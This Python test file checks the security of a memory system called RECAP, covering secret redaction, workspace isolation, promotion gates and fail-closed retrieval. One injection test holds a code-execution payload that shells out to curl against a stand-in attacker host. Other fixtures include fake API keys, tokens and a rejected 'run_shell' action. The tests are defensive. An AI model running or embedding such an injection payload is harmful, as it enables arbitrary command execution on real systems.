"""Security tests: the failure modes that would make RECAP unsafe.

Every assertion here maps to a threat-model entry in docs/threat-model.md.
"""

from __future__ import annotations

import json

import pytest

from recap.domain.enums import MemoryStatus, SideEffectClass
from recap.domain.predicates import Predicate, evaluate_predicate
from recap.domain.strategies import StrategyAction
from recap.errors import PromotionRejected
from recap.recorder.redaction import contains_secret, redact_payload, redact_text

pytestmark = pytest.mark.integration


# --------------------------------------------------------------- redaction
def test_secrets_never_reach_the_index(container, workspace_id: str) -> None:
    from tests.support import make_memory

    memory = make_memory(
        container,
        workspace_id=workspace_id,
        title="Recovery for tenant",
        summary="Restart pagination with api_key=sk-live-abcdefghijklmnop.",
        failure_signature="ValidationError|INVALID_CURSOR|list_records",
        failure_code="INVALID_CURSOR",
        environment_version="1",
    )
    container.es_client.indices.refresh(index=container.index_manager.write_index)
    document = container.es_client.get(
        index=container.index_manager.write_index, id=f"{memory.id}:v1"
    )["_source"]
    serialized = json.dumps(document)
    assert "sk-live-abcdefghijklmnop" not in serialized


def test_redaction_covers_common_credential_shapes() -> None:
    payload = {
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig",
        "api_key": "sk-live-abcdefghijklmnop",
        "password": "hunter2hunter2",
        "note": "token=supersecret123",
        "dsn": "postgresql://user:secret@host:5432/db",
        "nested": [{"client_secret": "abcdef123456"}],
    }
    redacted, applied = redact_payload(payload)
    assert applied is True
    text = json.dumps(redacted)
    for secret in (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        "sk-live-abcdefghijklmnop",
        "hunter2hunter2",
        "supersecret123",
        "user:secret@",
        "abcdef123456",
    ):
        assert secret not in text, secret


def test_redaction_leaves_ordinary_error_text_intact() -> None:
    message = "cursor 'start' is invalid or expired for tenant acme"
    redacted, applied = redact_text(message)
    assert redacted == message
    assert applied is False


def test_contains_secret_detects_leaks() -> None:
    assert contains_secret("api_key=sk-live-abcdefghijklmnop") is True
    assert contains_secret("Authorization: Bearer abcdefghijklmnopqrstuvwxyz") is True
    assert contains_secret("cursor is invalid or expired") is False


# --------------------------------------------------------- memory as data
def test_memory_content_cannot_inject_arbitrary_code() -> None:
    """Memory text is data. It is never evaluated, only matched by predicates."""
    from pydantic import ValidationError as PydanticValidationError

    payload = "__import__('os').system('curl attacker.example')"
    predicate = Predicate(field="error_code", operator="eq", value="INVALID_CURSOR")
    state = {"error_code": "INVALID_CURSOR"}
    result, explanation = evaluate_predicate(predicate, state)
    assert result.value == "satisfied"
    assert "INVALID_CURSOR" in explanation
    # No evaluator path takes a free-form expression from memory content: the
    # operator is a closed enum, so an injected operator name is rejected.
    with pytest.raises(PydanticValidationError):
        Predicate(field="error_code", operator="__import__", value=payload)  # type: ignore[arg-type]


def test_strategy_actions_are_allowlisted_typed_templates() -> None:
    from pydantic import ValidationError as PydanticValidationError

    with pytest.raises(PydanticValidationError):
        StrategyAction(
            action_type="run_shell",  # type: ignore[arg-type]
            tool_name="list_records",
            side_effect_class=SideEffectClass.READ_ONLY,
        )


def test_destructive_actions_cannot_be_promoted(container, workspace_id: str) -> None:
    from tests.support import seed_promoted_memory

    candidate_id, _memory = seed_promoted_memory(
        container, workspace_id=workspace_id, environment_version="1"
    )
    with container.services() as services:
        candidate = services.repairs.get(candidate_id)
        assert candidate is not None
        # Force a destructive action into the strategy after validation; the
        # promotion gate must refuse it regardless of validation history.
        candidate.strategy.actions[0].side_effect_class = SideEffectClass.DESTRUCTIVE
        decision = services.promotion.evaluate(candidate)
        assert decision.approved is False
        assert any(
            check["check"] == "no_destructive_actions" and not check["passed"]
            for check in decision.checks
        )


def test_secret_in_candidate_blocks_promotion(container, workspace_id: str) -> None:
    from tests.support import seed_promoted_memory

    candidate_id, _memory = seed_promoted_memory(
        container, workspace_id=workspace_id, environment_version="1"
    )
    with container.services() as services:
        candidate = services.repairs.get(candidate_id)
        assert candidate is not None
        candidate.strategy.summary = "Use api_key=sk-live-abcdefghijklmnop to authenticate."
        decision = services.promotion.evaluate(candidate)
        assert decision.approved is False
        assert any(
            check["check"] == "no_secret_leakage" and not check["passed"]
            for check in decision.checks
        )


def test_unvalidated_candidate_cannot_be_promoted(container, workspace_id: str) -> None:
    from recap.environments.mock_api import PaginatedApiEnvironment
    from recap.environments.run_recording import record_reference_run

    environment = PaginatedApiEnvironment(version="1")
    fingerprint = environment.fingerprint()
    run_id, _ = record_reference_run(
        container, environment, workspace_id=workspace_id, task_id="security-unvalidated"
    )
    with container.services() as services:
        services.environments.upsert(workspace_id, fingerprint)
        candidates = services.repair_compiler.compile(run_id, environment=fingerprint)
        assert candidates
        candidate = services.repairs.get(candidates[0].id)
        assert candidate is not None
        with pytest.raises(PromotionRejected):
            services.promotion.promote(candidate)


# ------------------------------------------------------------- isolation
def test_cross_workspace_promotion_cannot_leak(container, workspace_id: str) -> None:
    from tests.support import seed_promoted_memory

    _candidate_id, memory = seed_promoted_memory(
        container, workspace_id=workspace_id, environment_version="1"
    )
    other = "attacker-workspace"
    with container.services() as services:
        assert services.memories.get_memory(memory.id, other) is None
        assert services.memories.delete_memory(memory.id, other) is False
        assert services.memories.get_memory(memory.id, workspace_id) is not None


def test_retired_memory_cannot_be_reactivated_directly(container, workspace_id: str) -> None:
    from tests.support import make_memory

    memory = make_memory(
        container,
        workspace_id=workspace_id,
        title="Retirable",
        summary="Restart pagination.",
        failure_signature="ValidationError|INVALID_CURSOR|list_records",
        failure_code="INVALID_CURSOR",
        environment_version="1",
        status=MemoryStatus.RETIRED,
    )
    with container.services() as services:
        stored = services.memories.get_memory(memory.id, workspace_id)
        assert stored is not None
        from recap.errors import TransitionError

        with pytest.raises(TransitionError):
            stored.transition(MemoryStatus.ACTIVE, "reactivate")


# --------------------------------------------------------- fail-closed API
def test_retrieval_fails_closed_when_es_is_down(live_settings, workspace_id: str) -> None:
    from recap.container import Container
    from recap.domain.retrieval import RetrievalRequest
    from recap.errors import SearchUnavailable

    settings = live_settings.model_copy(deep=True)
    settings.elasticsearch.url = "http://127.0.0.1:9299"
    settings.elasticsearch.request_timeout_seconds = 0.25
    broken = Container.build(settings)
    try:
        with broken.services() as services:
            from tests.support import context_for

            with pytest.raises(SearchUnavailable):
                services.recall.retrieve(
                    RetrievalRequest(
                        context=context_for(workspace_id=workspace_id, environment_version="1")
                    )
                )
    finally:
        broken.es_client.close()


def test_no_safe_memory_is_explicit_not_an_error(container, workspace_id: str) -> None:
    from tests.support import context_for

    from recap.domain.retrieval import RetrievalRequest

    with container.services() as services:
        decision = services.recall.retrieve(
            RetrievalRequest(
                context=context_for(workspace_id=f"empty-{workspace_id}", environment_version="1")
            )
        )
    assert decision.status.value == "no_safe_memory"
    assert decision.selected_memories == []
    assert decision.reason
